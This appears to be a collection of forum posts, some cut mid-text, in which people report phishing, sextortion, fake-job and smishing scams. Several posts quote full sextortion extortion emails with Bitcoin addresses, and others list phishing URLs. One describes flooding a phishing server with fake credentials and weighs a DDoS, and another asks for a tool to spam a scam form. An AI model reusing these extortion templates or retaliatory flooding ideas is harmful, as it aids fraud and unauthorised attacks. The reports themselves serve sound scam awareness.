2. The link does go to a zoom meeting and they have some zoom exploit that they are going to use. Seems unlikely and would be dangerous. Also why would they include the redirection domain in this case? for click tracking?
3. The link does go to a zoom meeting and something/somebody on the call is going to try and convince me to do something more.

1588755054.0,"New scam claiming to be Microsoft account team, contact details show my own email","I've just received an email that claims to be from Microsoft account team saying that I've exceeded my storage limit and need to re-login to update my email address (that doesn't really make any sense to me). I checked the contact details expecting an obviously fake email address but all that it shows when I click it is my own email address as if it was just a notification instead of an email.

1571402472.0,Report: Careful when you loose an iPhone,"I use Airbnb so people comes to my apartment, I went on vacations for a week, I decided to block my calendar so that I didn‚Äôt host anyone because my apartment was going to be alone and when I came back I noticed that my second iPhone was stolen....

Two days later I started receiving several sms messages telling me that my phone was turned on, connected to the internet, located, ‚Äúchanges were made to the phone‚Äù, etc... with a link to view the phone on the map.

The url was http://appIeconnect.la/56556

Notice that there is an uppercase letter, when you open the site it becomes lower case, the url in reality is http://appieconnect.la/56556

The url they send has a number that identifies you and ONLY works when someone is attacking you.

Because the link only works when someone is attacking, note that google chrome, safari and opera didn‚Äôt recognize the site as suspicious and didn‚Äôt raise an alert because they don‚Äôt use SSL. 

When browsers start raising alerts, they change the url. This is another example: http://icloudfound.com/56556

They are using amazon web services SMS service, so messages are coming from US and (if you don‚Äôt live in the US) also from local numbers, many services use that service to send two factor authentication codes, so truecaller and sms filtering apps didn‚Äôt recognize the sms or phone numbers as suspicious. Sms messages also are in the language you speak, in my case Spanish, but in that moment I didn‚Äôt realize that I have all my devices and services in English and should get the sms in English. 

The sms number was sent to my personal phone number, not to the number of the SIM card that was on that phone, the sms includes iPhone model, capacity 

When you open the site you see a PERFECT iCloud site, with proper colors, perfect animations, responsive (works great in phones and desktop browsers), perfect canvas.

They ask for a six digit code, I didn‚Äôt know what they‚Äôre asking for, so I called Apple. Important thing to note here: Apple didn‚Äôt tell me that they do not send sms messages when a phone is found. The site actually was asking for my pin code... they don‚Äôt tell you, so in that state of mind trying to do as much as you can to screw the thief, you start typing numbers and trying to guess in order to see the map... one of the many tries could include sensitive numbers you use such as... the pin code.

I think someone is selling ‚Äúphishing as a service‚Äù they asked me for my pin because they needed it, but the ‚Äúcustomer‚Äù may want your iCloud account so the site could ask for id and password if they need it. 

I work at the IT industry, so trust me: the attack it is very well planned, very well made. 

I‚Äôll paste the sms I got

I've been urgently looking for a new place to stay and put up ads on specialized websites. I live in Germany and this dude from the US offers me his flat in Berlin. Since he isn't present in the city, I couldn't meet or get a look at the unit in person until I've sent him a damage deposit payment and he's sent the house keys from the States. He asked for some info on me (Name, marital status, current address, phone number, skype username) and made me sign a ""lease agreement"", which looks legit enough. He sent me pictures of the place and out of excitement, I signed the document.

It was only when he gave me his bank account details (which he claims are his lawyer's bank details) that I became suspicious. I tried reverse searching the images he sent me and nothing came up. The address is real, the law firm he claims is involved is real. The thing is, the address of the bank account he sent me probably isn't, at least that's what it looks like on Whitepages. I've emailed the law firm to ask for confirmation of their involvement.

At first they asked for a bitcoin payment but I said that was confusing so they gave me their Western Union info including: First Name, Last Name, Address. Can I report them somehow using this info? Are they one step closer to being caught since they gave me this info?

EDIT: to be clear, I know this is a total scam and they actually have nothing on me. I'm positive of this for MULTIPLE reasons: they sent it to my work email which has no person associated with it, I have no webcam, I definitely did not masturbate to porn at work (or anywhere, for that matter (recently, at least (TMI?))).

Here is the text of the original scam email:

*THE SECOND WARNING*

*You ignored my first email, but I am not going to ignore your mistakes, don‚Äôt be stupid and do as I say. I know your passwords (check this email subject), I know about your daily life, your internet activities and you know nothing about me, and you must be wondering why you are getting this email, right? I installed a malware on the adult (porn) website and guess what, you visited this website to have fun (you know what I mean!). While you were watching the porn, your web browser started functioning as an RDP+keylogger, which gave me access to your display screen and camera. Right after that, my software collected all of your contacts from your Facebook account, Messenger account, and email account, then, I created a double screen video. The first part shows the video you were watching (you have a nice taste lol), and the second part shows the recording of your camera (it is you!). You have two options -*

*1. First option is to ignore this email. In this case, I will send the recorded video clip of yours to all of your contacts lists, associates and social network friends. just imagine the humiliation you will feel from this. Don't forget that this can also affect your relationship as well.*

*2. Second option is to pay me $2000. Since you decided to ignore my first email, the price is now $3000. We will call it a donation. In this case, I will right away delete your video and all of your information I have about you (including your contact lists) and you will never hear from me again. You can continue your daily life like this never happened.*

*You will make the payment via bitcoin. If you do not know about bitcoin, search Google for ""how to buy bitcoin"". You can also get the bitcoin from sites like Bitstamp, Coinbase, Kraken, Bitcoin Atm, Localbitcoins, etc. Bitcoin (i.e. BTC) address to which you need to send $3000 is - 1AjJCkBTA8aPDLLCpW6Am1z1FKUEroQzeT*

*Send exactly 0.291578 BTC to my address so i will know is you:*

*1AjJCkBTA8aPDLLCpW6Am1z1FKUEroQzeT*

*(copy it and paste - it‚Äôs case sensitive)*

*If you are thinking to go to the police, good luck,I am from russia and I have taken every step to make sure that this email cannot be traced back to me. You have 72 hours to pay me. I have a special pixel in this email, and at this moment, I know that you have read this email.*

*Contact me on this email address* [*chupachu147@gmail.com*](mailto:chupachu147@gmail.com) *copy to* [*manpachu147@aol.com*](mailto:manpachu147@aol.com) *with this subject: 012VIPERMARVO- RESTOREKEYPC4102934 After this steps you will receive through email the key and a decrypt tutorial.*

*Remember to send the exact amount as above! This way I will know it‚Äôs from you. Do not be angry at me. This is just my job, and you are not the only person I caught.*

*Be angry at your fantasies - if you didn‚Äôt visit those sites for adults you would have no problem.. but now...*

1565532428.0,HBONOW Phishing,"My mom got me involved in this one last night. 

She was trying to set up my HBONOW account on her Roku and went to the wrong website to type in the activation code. When it didn‚Äôt work, they said they needed to call me. I figured they just needed to verify that it was my account, especially since I had signed into HBONOW on my Smart TV earlier in the day, or that I might have to upgrade to a different tier for multiple screens, like Netflix. I was in the middle of something and was trying to move it along, so I wasn‚Äôt too suspicious until it got really bad. 

The caller immediately launched into a spiel about ‚Äúa one-time service fee of $29.99‚Äù to activate the account on the Roku. I asked why I needed to pay thirty dollars for a service that I‚Äôve been using for months at $15. She told me not to worry, it was a one-time fee, just for today, can I go ahead and start that for you? I asked again exactly what the fee was for, and she said something to the effect of ‚Äúindependent service fee for the Roku.‚Äù My mom was texting me the whole time this was happening asking for updates. I said alright and gave her my bank card info. 

She seemed to have some trouble understanding me, as I had to repeat my card number several times (I have a confusing card number with some repeating digits, so I‚Äôm kind of used to this when I give my number over the phone) but I got a little wary when she repeated my card number back to me to confirm. Usually, I‚Äôve had people say that they can‚Äôt repeat the number back to me for security purposes, but can I confirm how many X‚Äôs appear, or have me repeat the number. 

After confirming my bank card number, she asked for my HBONOW password. I really started to get suspicious here, but I figured it would be over soon and I could get back to my project. I gave her what I thought was my password (I use two or three passwords, so it‚Äôs always gotta be one of those) but it turns out it was wrong. This prompted her to ask me to reset my password. I said ‚Äúyou know, I don‚Äôt think that‚Äôs necessary, and I really don‚Äôt want to continue this right now.‚Äù She insisted we were almost done, that she had already sent me the email link to reset my password, just go ahead and reset it to this phrase. I said I hadn‚Äôt received an email and that I didn‚Äôt want to continue this. At this point, the call dropped. 

The call had been dropped several times throughout this ordeal, but she always called me back immediately. While waiting for her to call me back, my mom and I determined that this was a phishing scheme and that if she called me back, I would tell them to stuff it and leave me alone. I also got the email to reset my password, but did not click on the link. 

She called me back and before I was able to tell her that I was done with her bs, she said ‚ÄúWhy don‚Äôt you just give me your gmail password and I‚Äôll sign in and reset the password for you.‚Äù

Now they‚Äôve made me angry. 

I said there was no way in hell I was going to give them my Gmail password, I did not want to pay any fee and I was done with this conversation. She transferred me to a ‚Äútechnician‚Äù who started from the beginning, with the $30 service fee. I told him that I would not be giving him any more information, that someone had just asked me for my gmail password and that I wanted to cancel everything (I wasn‚Äôt sure what ‚Äúcanceling everything‚Äù would accomplish, but I was fed up and just wanted to shout at someone.) 

He transferred me to a ‚ÄúLevel 3 Technician‚Äù who again started from the $30 service fee. He asked me if I wanted to go ahead and start that process and I said ‚Äúabsolutely not.‚Äù He confirmed that I did not want to pay the fee and regretfully informed me that if I didn‚Äôt pay, they wouldn‚Äôt be able to set up the service. I said that was fine with me and we hung up. 

They hadn‚Äôt taken any money out of my bank account at that point, but on the advice of my boyfriend, I cancelled the bank card and will be calling them on Monday to get a new card. I also changed all of my passwords. 

Not sure if I can report this somewhere or if there‚Äôs anything else I should do just to be safe, but I‚Äôm sure that they‚Äôre not just doing this for HBO accounts.",phishing,4183,820,72,1

1510168772.0,Phishing Program Checklist. After 5 years of managing phishing training programs here is what I've learned:,"1. Agreement
    1. This should involve a small stakeholder ‚Äúteam‚Äù from various departments that all give support and act as liaisons for the effort: Infosec, IT (mail team & support team), Legal, HR, Corp Comm, Executive team. 
2. Transparency
    1. This should not be a ‚Äúsecret‚Äù project. The success of the program in building trust with your end users and changing behavior rely heavily on the fact that they do not feel ‚Äútricked‚Äù or they can‚Äôt trust the infosec team.
    2. Clear communication on what the program is, why the company is doing it, and how the users will be affected (what should they expect at every turn).
3. Tested processes.
    1. Is there a reporting button that needs to be installed?
    2. Do you have a simple email address for users to report to?
    3. Have you whitelisted all potential domains for education purposes?
        1. There is a difference from whitelisting email servers with your exchange team and whitelisting domains and URLS for ALL of your filters. I‚Äôve seen some companies with 5 layers of filtering that needed to be completed to ensure proper email delivery and education experience.
    4. Test to IT first, and then expand to a slightly larger group across multiple forests or trees in the AD environment to make sure nothing was missed.
4. Communications
    1. Stakeholders: (initial program announcement, separate comm; 48 hours prior to launch as reminder) this announcement should introduce them to the project, verify the goals of the project, and identify what their role is within the project. Many of them will have team members reaching out to them with questions, so they need to have all the info to answer those questions. If you let them provide their own answers - your program will turn into a crapshoot quickly.
    2. Security Stakeholders (48 hours prior to launch): these are the teams that make the program run smoothly. This will be those on IT support, exchange admin, infosec & IR teams responsible for blocking links and spinning up response processes. They need to be aware what is coming so they can response appropriately as calls come in. They should have relevant info on the campaign (Subject, sender, date/time, content)
    3. Users: they should receive two communications generally - one initially announcing the program. This can be two months out from kickoff. They should receive another message 2 weeks prior to first campaign launch. This message should remind them of the program, and what they should do.
5. Clear and simple guidance
    1. You are training your users, not testing them. The goal of these programs should be to change user behavior, not make them feel like they failed something. Positivity.
    2. What users need to know:
        1. How to report stuff. Do you have a clear and simple method for them to report phishing emails (Outlook button? Simple email address to forward as attachment?). It needs to be a single, simple action to be successful. 
        2. What to stuff to report. Anything? Don‚Äôt make them know the difference between SPAM and Phishing. They should be reporting anything that feels ‚Äúweird‚Äù. Your teams should handle the SPAM stuff via properly tuned applications and architecture.
    3. It‚Äôs okay if they give each other a heads up about the program. While we don‚Äôt want to do it, if it were a real phishing email that is what we would want them to do. So while it is tempting to scold when they do this, you need to encourage them that the action they took was correct.
    4. IT Support and stakeholders. They need to know how to respond to users inquiring about whether or not its a ‚Äútest‚Äù. Regardless it should always be the same response - ‚Äúyes this is a phishing email, please report it via‚Ä¶‚Äù and constantly reinforcing the desired behavior and positive acknowledgement that they identified a threat.
6. Metrics & Reporting
    1. Everyone wants the click rate - but this is mostly bogus, so don‚Äôt fall into that trap. Its a metric senior leadership will want to know - but having them understand the lack of strength in the actual reporting is key. This data point does not tell the whole story (difficulty, outside factors like time of year, vacations, holidays, trending media coverage, etc.). 
        1. Accepting the click rate SHOULD vary from 7% - 35% consistently. If you are consistently hitting below 10%, you are failing to train your users properly.
    2. Focus on getting report rates. # of users who reported. This shows behavior change consistently across campaigns and shows program effectiveness.
        1. This also allows you to empower your IR team - if you are having 50% of your users reporting emails, they can reduce their response time to take action. Executives love that shit.
    3. Role based metrics - break out into interesting stories: Executives, People Managers, Users, Contractors, Temps, IT/Privileged Accts.
    4. Average time to report sounds fun but isn‚Äôt a clear number - you have no idea how many people are in meetings for 3 hours at a time before they get their email. Too many outliers.
    5. Region - if you‚Äôre global keep it to  bigger buckets (North America, EMEA, APAC)
    6. Employment time. This is good to show training effectiveness for new hires versus long term and can provide opps for awareness.",phishing,5304,890,133,1

On the day of 25/03/2023 13:08:23
, I penetrated your device's operating system and seized total control of your account ""my name
"". I've been keeping a thorough watch on you for a long time.

I've introduced software into your system that grants me dominion over all your devices.
Through the malware I've deployed, I've gained control over your device's primary functions such as your microphone, video camera, keyboard, and display. I've moved all your personal data, photos, and browsing history to my servers. I now have access to all your messaging apps, social media accounts, emails, synced data, chat histories, and contact lists.
It's quite interesting what I've found about you!

Intriguing thoughts flooded my mind about the applications of this data...
A fascinating idea has recently come to mind: using artificial intelligence to create a split-screen video. On one side, you're engaged in masturbate  , and on the other, you're interacting with an intriguing website. Videos of this nature are rapidly gaining popularity.

The result? Totally knocked my socks off.

With a single click, I can distribute this video to all your contacts through email, social networks, and instant messengers. Furthermore, I could expose access to all the emails and messaging apps you use.
Additionally, I found a plethora of intriguing materials that I could disseminate online and share with friends.

If you don't want me to do it, send me 1250 $ (US dollar) to my Bitcoin wallet.
My BTC address:
bc1qnurm5wx3r7enmvnn087g0e3u9mwepw8jn6d035

If you're unfamiliar with how to fund a Bitcoin wallet, you can always use Google for help. It's quite straightforward.
Upon receipt of the funds, I will promptly eliminate all unwanted material. Subsequently, we will go our separate ways. I pledge to deactivate and remove all malware from your devices without fail. You can have complete confidence in me; I stand firmly behind my words. This agreement is fair, particularly given the significant time and effort I have dedicated to tracking your profile and traffic.

You have exactly two days (48 hours) from the time this letter is opened to make the payment.

After this period, if I don't receive the specified amount from you, I'll distribute access to your accounts, visited sites, personal data, and edited videos to everyone, without any warning.

Remember. I don't make mistakes. I would advise against taking this lightly; I have many resources at my disposal.

There's no point complaining about me because they can't find me. Formatting the drive or destroying the device won't help because I already have your data.

Any responses to this email will not be reviewed or seen, as it is not a personal account and does not receive replies.




Good luck, and don't let this upset you!

Each person has their line of work, today you just happened to be on the wrong end of mine.




P.S. A word to the wise - in the future, ensure you follow the safety norms of the internet and abstain from dodgy websites.

When following the link to add an external account there is a pop-up window that resembles Plaid's external acct API. However Stripe confirmed to me that they are using their own code for this element.

There is a ""bank"" listed under the name Lili, which you may recognize as the popular mobile banking app featuring a yellow and black logo. The form simply displays a field for your username and password, and then a link at the bottom ""continue to financial institution"" as well as ""Submit."" 

Following the former will redirect you to the domain ""lilibank.com,"" which appears to be some sort of real estate company based out of Canada. However, there's little to no actual information on this site. And the few listings I attempted to verify were not even for sale. The site also has no real information on who controls it or how to contact them, lots of 404's etc.

1649621447.0,Is Anyone Else on Reddit Getting Phished by Fake Accounts?,"I've been getting notifications of fake accounts following mine.  I've clicked on the links to each user's page every time, and I've noticed a pattern with the three accounts:

1. The user claims to be a conventionally attractive young woman looking for sex.  Their bios often talk about how ""wet"" and thirsty they are, and they even use photos of young women posing provocatively, usually in revealing, tight-fitting clothing or just their underwear.
2. None of these users have any posts or comments in their history.

Even if these were real girls looking to hook up and get some action, I'm still not interested in them following me right off the bat the very second they've freshly created a Reddit account.  It just doesn't seem natural to me that someone would follow a complete stranger without first finding them on a certain subreddit, most likely one dedicated to hooking up, which I am not at all part of.

I would feel bad if I had accidentally blocked a real person who thought I was a completely different user with a very similar username, but unless that person is either incredibly bad at communicating or giving out a fake username because he's a serial cheater, it's highly unlikely that this is the case, considering it's happened more than once.  I'm getting very annoyed at this point and just want this to stop.

Also, in case it has anything to do with it, I also got phished through my text messages a couple of times from two different phone numbers pretending to be the same thirsty redhead who claims to have gotten a wrong number from a guy she hooked up with.  Further details include racy selfies and even nude pics, oblivion to the meaning of the word ""no"" that would make you think this woman needs mental help if she's even a real person, and pertinent existence that I'm a guy with a ""huge cock,"" even after I told her several times that I'm a straight woman who is not interested.  Also, the second time around I started getting kind of rude because I was just getting tired of having my privacy breached by either a mentally unwell woman who refused to let go and consider how her actions were affecting both herself and others or either a catfish or phishing AI.  The three above incidents that have happened to me here on Reddit reminded me of this, which is why I'm mentioning it, as I think there's a possibility that they're connected.",phishing,2378,422,56,1

1628701461.0,Potential Instagram Phishing,"My friend texted me this, and I immediately knew this was suspicious.

I was bit curious to what it was, so I went on my VM to open the link using Microsoft Edge. It redirected me to an Instagram login page that looked pretty real. Not wanting to use my main Instagram credentials, I signed up using an alternate email address. It asked for a email verification, and I gave it. But I stopped the sign up when it asked for a phone number for an SMS verification. Unfortunately, that process didn't have a skip function, which by itself seemed weird to me.

After this halt on my VM, my curiosity got the best of me, and I opened up the link on my main PC. However, it didn't redirect me to the login page. It was stuck loading. There was nothing downloaded, or asked for permission for anything. I'll change my main Instagram's password, just in case though.

I'm still puzzled on what the link actually does. The website I was redirected to seemed official. The URL didn't contain anything weird. So I'm hoping someone can shed a light to this. Thanks for reading.

I checked my email today and noticed that I had received an email from coinbase asking me to verify my email address.

Because I didn't sign up for the account, I left the email alone and continued to check my other emails. The problem is that I also received another email from coinbase that stated my account had been verified which has me concerned. When I checked my email, both were unopened. I've checked my email account  and only my devices are active and connected to the account and there is no email forwarding, filters, etc. When I go to coinbase and try to recover my password, I don't receive any emails from coinbase, just like if I didn't have an account there.

So I am currently seeking jobs on Indeed and my profile is set to private as well as my resume.  I then get a message on Indeed from a recruiter that has an opportunity by the name of Alfredo Gruspe from Thorkelson Ltd, looking to fill a chat specialist position in that company (I get these messages all the time.)

So I agree for my email to be shared. A day or 2 later I receive an email from another person from the company an HR Manager by the name of Loretta Shaffer saying how she looked at my profile on indeed and says there's an opening for an Online Service Manager she'd like to tell me more.

2 minor red flags I did not pay heed to in the email when greeting me she referenced my email, and she's emailing about another job. Anyways she explained the position and another thing I didn't pay attention too the duties were somewhat vague and didn't make sense. I googled the company they had a website looked kind of legit didn't really pay much heed because they did not ask for any sensitive information or anything so continued she said if I am interested

I need to make an application on the website which I did this is where I kind of slipped the ball I inputted my name, address, and phone number, and age. But all of this is on my resume so did not think much except the age. Anyways the biggest red flag was the when I got the offer letter it did not make sense that a company would offer a position without a phone interview or video so I ended all communication with them and will be reporting to the fraud authorities in Canada. Hopefully they are not able to do much with the info I gave them but I will be monitoring my Transunion and equifax monthly to be certain.

We ask that you do not open new accounts as any new order you place may be delayed. We appreciate your patience with our security measures. Thank you for your attention. Best regards,
Amazon Service Team"" 

The email included a link that said ""Check Now"". Now, my Amazon account has been locked for the last six months with no explanation and I've been calling their customer service non-stop.  There had been no response and I thought the phishing email was the response I had been waiting for.  So, being the moron that I am, I clicked it on my laptop because I saw that the email was from ""no-reply@amazon.com"" which was really just the display name and the address was a sketchy ass email.  I was greeted by the Google Chrome ""Dangerous Website"" warning and my fucking stomach dropped.  I immediately clicked out of the link (no forms filled out at all) and cleared my browser history. I have McAfee Total Protection installed as well as the standard Windows antivirus.  Usually McAfee will scan any downloads made automatically, and I'll receive a pop-up letting me know that it's been scanned.  No pop-up was shown, and I didn't see any downloads in my File Explorer.  I disconnected from my wifi and did a Quick Scan with McAfee, which detected no virus.  I am currently running a full scan, but I'm awaiting results.  

As you can probably tell I'm pretty stupid with computers, but I know nothing about malware/viruses/ransomware/spyware except they scare the shit out of me.  I'm not too worried about any accounts of mine getting breached since I didn't fill out any forms (I'm certainly going to change sensitive passwords anyways).  But I'm worried about any hidden malware that can be on my computer now.  What is the likelihood that this link click has resulted in the hidden download of malware? Is there any major steps I'm missing that I should take for harm reduction? And also, when can i be pretty sure that my computer is safe and my accounts are safe? I don't want to be blindsided by this like half a year from now.
I really hope I'm overreacting right now but I have absolutely no idea what to think, my mind is racing at a million miles an hour right now.  Thank you, and apologies for the wall of text

I had a friend approach me on FB messenger asking if I could help them retrieve their code as their phone was messing up. I said yes, gave them my mobile number and the codes that they sent to me (For gmail too).

They signed me out of my accounts and I started to suspect they were hacking me so I confronted them and they replied saying that they think they know what's going on and to give them 1 sec to fix it. I immediately got logged back onto FB and Google and they somehow earned back my trust. At this point I still think the hacker is my friend.
They go onto saying that they're still trying to figure it out on their account and to DL Skype so we can talk if it boots me out again. 

It's getting late and I have to go to bed so I tell them to sort it out and msg me in the morning if it works. They're adamant that we get it sorted out quickly now, as they have a ""super busy day tomorrow"". So i go onto Skype and they add me, I get booted again and they call me but there's no voice or cam. So they hang up and tell me to call, but this time it's just my voice and my camera on. I kept most of my face out of the camera as I didn't really know why I needed it on... 

I asked what was taking so long for them to connect to the call, and they said its probably a reception problem.
They continue on to say ""why don't you read this while we wait"" and they copy and pasted a threat and a nude photo I took years ago. I didn't get to read all of the threat, when I called out for my partner the hacker deleted the threats and messages cursing me out for telling my bf. I responded saying I didn't care, and that I was going to bed. And they switched from a malicious tone to a relaxed tone saying ""it's just a joke"" ""Night haha"" 

I have reported it to cyber security here and have factory reset my phone. 
I'm concerned with what they can do with the information they have received. I can't delete or reset any accounts as they have my mobile number and they've already reset everything i can think of.

I was phished by these people this morning, just want to put the word out and warn others. They offered $20/hr for an ""assistant"" job on Indeed and emailed me with an offer. Without an interview or so much as a phone call, I get an employment contract (Which I hope they can't do anything with because I signed it like a fool).

They then quickly set up a meeting on telegram (I posted the conversation). Before the meeting I got a call from them which seemed genuine, basically just generic questions and going over my resume. Then I'm told to wait until they're ready to conduct the telegram meeting where they break into a whole tirade about Ethereum. The idea is that they want me to set up an account so I can preform my duties, which I guess are simply making domain purchases with company money for their clients.

They wanted my ID with a picture of myself self, which sounds like identity theft in the making. Normally you should fill out information like this on a proper application form. When I asked for one they said they'd look, when I asked where they were located, they went silent. Their plan probably involves asking for more info if you indulge them. The ethereum account may eventually require some activation, who knows, I didn't get that far. But they'd probably try to link it to your person and either bleed you or commit fraud under your name.

According to their website they operate from the Guinness Business Center in Vancouver (which is conveniently a rental space). I attached the face of the woman conducting the orientation in case someone tries to find out about this company using a reverse image search (I couldn't find her though). And a search for kannis group is much more likely to yield results for a 2 employee company in bolivia than this vancouver based one.

1602676516.0,"In an effort to find out if a Paypal Phishing Email was real or not, I found something.","So I received an email on my phone telling me that my PayPal account was locked. I ignored it, stating in my head that I would deal with it later. However, when I opened up the email on my PC, something just felt off for me. So I did what any sensible person would do and instead of clicking on the link to ""verify my identity"" I went to PayPal itself and tried to log in. And what do you know, I can log in just fine with no problems.

So long story short it's obviously a scam, but this isn't what the post is about. After I reported the email to Paypal I wanted to dig a little deeper into this since I don't usually get that many phishing attempts sent to my email. When I first looked at the email from my phone, I noticed the email was addressed as [service@PayPal.com](mailto:service@PayPal.com) , which seemed legit until I opened it on my pc and realized that that was just the account's name, and the actual log in ID was a bunch of random letters and numbers @ what I can only assume to be a free mail hosting service. Kinda scary how most phones only show the email's name since as I can see how a lot of people might be tricked by that, but that's besides the point. I inspected the button they sent in that email and found it linking to what is clearly not PayPal, but I wasn't brave enough to actually see where it went. However, when I went to view the raw message, a feature I was only slightly aware of in Yahoo Mail, I was able to go through it and pretend I understood exactly what everything meant.

Obviously, I click on it. As soon as I do, immediately I'm suspicious. There seems to be hardly any contact information on the site. There are very obvious spelling errors. There's a time limit on the site, and a time limit for free shipping. Looking up ""izizstore"" on google results in nothing.

Hi xar42,

I need you to execute a payment to Vendor, confirm if you can get it done today so I can forward you the payee details,

It seemed like something he would send me, so I replied with ""Yes, I can send a check today."" Then I got a reply with a name and address, asking ""for the check to be mailed out via usps/ups/fed ex next day delivery."" This irritated me, since I usually write checks electronically via the bank's website, and now I have to write a physical check and get to FedEx before they closed - which was enough to make me look more closely at the e-mail. Then, I noticed that the e-mail address was some made up garbage @gmail.com.

Unsure what to do, I called the local police department for the address they gave me. They referred me to the Attorney General in that state. The Attorney General's office referred me to the FTC. I filled out all the information on the FTC's website. It seemed like they asked all the right questions in the form, but I still wonder if they'll do anything - and it seems like it would be easy to nail them, because I have the name and address and I haven't tipped them off yet that I'm on to them (unless they read Reddit).

Now at this point I'd had a few emails from some other colleagues who had fallen for this, I decided to take some action.

Now obviously a DDOS attack would have worked however it's only a temporary solution.

So I decided that wasting the operator's time at the other end of the server would be a better solution.

I decided to start by sending lovely working credentials to the server.
For some reason I decided that this would be too simple. 
I added a few random numbers to ensure it wasn't a simple replace-all job.

I then realised it's missing the entire troll aspect of the internet, of course I'm sending 7 requests a second each with random numbers in various places in the username but how do I incorporate the primary function of the internet.

I didn‚Äôt do this, however I did respond to the email.

Someone had created a fake web domain and email address of an existing company and copied job posts from their website and changed them to include false contact information and then posted these jobs to a job site.

They have my CV- which contains my email address, website and my personal telephone number, as well as my business address (which is on my email signature).

I just wondered if this is something I need to be worried about in terms of the info they have on me?

Any advice would be much appreciated.

A cursory google search showed that this ISP has a very plain website and is connected to phishing.

The phishing link was: http://x.co/6lsUZ. Using checkshorturl.com, I exploded that to  	https://apptrustedcloud.komsalam-service.info/. (Google translate tells me ""komsalam"" means ""As a Muslim"" in Arabic, possibly suggesting ISIL ties, perhaps?)

The domain is registered to one Paula Alper, no organization, 2578 Balwynne Park Road, 19131 Philadelphia. Tech email is oscar_shales@hornyalwary.top. The domain is marked as inactive and on client hold.

The site has a Let's Encrypt Authority X3 certificate made out to global-cheat.center (at least the name is honest there), valid from May 22 - August 20, 2017. (Is the short duration indicative of anything, here?) This FQDN is actually resolveable, leading only to a website with a private cgi directory.

to \[REDACTED\]

Good day. The following details might be of interest to you.

3/24/2023 3:09:36 PM

is when I managed to compromise your device's operating system, gaining unrestricted access to your account ""\[REDACTED\] "". I've been diligently observing your activities for a considerable span of time.

I've established software on your system that lets me manage all your devices.

The malware I've positioned gives me complete command over your device's essential tools ‚Äì your microphone, video camera, keyboard, and display. Your data, photos, and browsing history now reside on my servers, along with access to all your communication platforms ‚Äì messengers, social networks, emails, synced data, chat histories, and contact lists.

It's quite interesting what I've found about you!

I deliberated on how I could leverage this data...

Recently, I've conceptualized an intriguing idea: using AI to develop a split-screen video. One side displays you involved in masturbate , while the other casts your internet navigations. Videos like this are currently trending!

I mean, what we ended up with, it's just... wow.

With a single click, I can distribute this video to all your contacts through email, social networks, and instant messengers. Furthermore, I could expose access to all the emails and messaging apps you use.

Additionally, I found a plethora of intriguing materials that I could disseminate online and share with friends.

If you don't want me to do it, send me 1100 $ (US dollar) in my bitcoin wallet.

BTC address:

bc1qa7s0gqxyn3922tr4fxcpv7s0n6q7muy29tvc8f

If you're unfamiliar with how to fund a Bitcoin wallet, you can always use Google for help. It's quite straightforward.

Upon receipt of the funds, I will promptly eliminate all unwanted material. Subsequently, we will go our separate ways. I pledge to deactivate and remove all malware from your devices without fail. You can have complete confidence in me; I stand firmly behind my words. This agreement is fair, particularly given the significant time and effort I have dedicated to tracking your profile and traffic.

You have exactly two days (48 hours) from the time this letter is opened to make the payment.

After this period, if I do not receive the specified amount from you, I will send everyone access to your accounts and visited sites, personal data, and edited videos without warning.

You see, I don't mess up. It's not a good idea to try and pull pranks on me because I have plenty of tricks up my sleeve.

There's no point complaining about me because they can't find me. Formatting the drive or destroying the device won't help because I already have your data.

Replying to this message is futile - I didn't use a personal email to send it and I won't be checking for responses.

Best of luck, and don't take it too personally!

We all have our roles, and it seems you drew the short straw today.

P.S. In the future, I recommend that you follow the safety rules on the Internet and do not visit dubious sites.

The link takes me to a fake 'International postal service' website and then a form to fill in info and card details to 'release the package'. Is there anyway of making their lives difficult through going through some sort of automation or some sort of software I can get hold of that would fill out the form with rubbish like 1000 times till they have to close it?

She got her new card, went to [jetbluemastercard.com/activate](https://jetbluemastercard.com/activate), and activated it.  The next day, a new fraud alert, and she had not even used her card.  We get a new (third) card today, and I go on my laptop (Mac, Safari browser) to do the activation.  I type in the address (which was on a sticker on the card) and hit return, and immediately all my antenna go up.  The website looks sketchy, with typos, and the address domain is not jetbluemastercard or Barclays (the issuing bank), but instead ""[teuscherfifthavenue.com](https://teuscherfifthavenue.com) ""  I go back and retype the address, this time making sure I don't just hit return and accept the google ""top hit"", and it takes me to he correct site.  Apparently what had happened with the second card is she went to this site, didn't notice, entered her info, and her new number got lifted.  The site does ultimately take you to the correct activation site (since they want you to activate your card), but of course by then its too late.  

Not sure exactly what is going on.  It seems like someone set up this site and gamed it so that it shows up first on the Google search when you type the [jetbluemastercard.com/activate](https://jetbluemastercard.com/activate) address.  I had not gone to this site previously since she had activated the second card on her own laptop, and today I used mine.  But it seems like if you type in the correct address and then just hit return without thinking about it, you're taken there and not to the correct site.

1692405904.0,The Dangers of Scanning a Random QR Code in the Wild (Social Experiment),"This post is a social experiment and the QR code you just scanned is perfectly safe and is intended as a social experiment and a neat way help bring awareness to Cybersecurity and it's professional field and inspire somebody to take interest in this complex and incredibly gratifying line of work.

QR codes have become an important part of our daily lives, providing quick access to websites, products, and services. While they offer incredible convenience, scanning random or untrusted QR codes can lead to several security risks.

A malicious QR code can direct your browser to a website filled with malware, potentially compromising your device's security. There's also a risk of landing on phishing sites that look legitimate but are designed to steal your personal information. These QR codes can even execute unwanted actions on your device, such as sending texts or changing settings, without your consent.

Unlike traditional URLs, QR codes don't always reveal the linked address beforehand. This lack of transparency can mask the attacker's intentions, making it even easier to deceive unsuspecting victims. Furthermore, some QR codes can track and share your location, leading to serious privacy concerns.

To protect yourself from these hidden dangers, it's essential to exercise caution when scanning QR codes. Always consider the source and ensure it's from a trusted entity. Utilize a scanner with security features, and keep your device's security software up to date.

While QR codes offer many conveniences, the potential risks associated with random or untrustworthy codes should not be ignored. With a cautious approach, you can enjoy the benefits of QR codes without compromising your digital privacy and security.

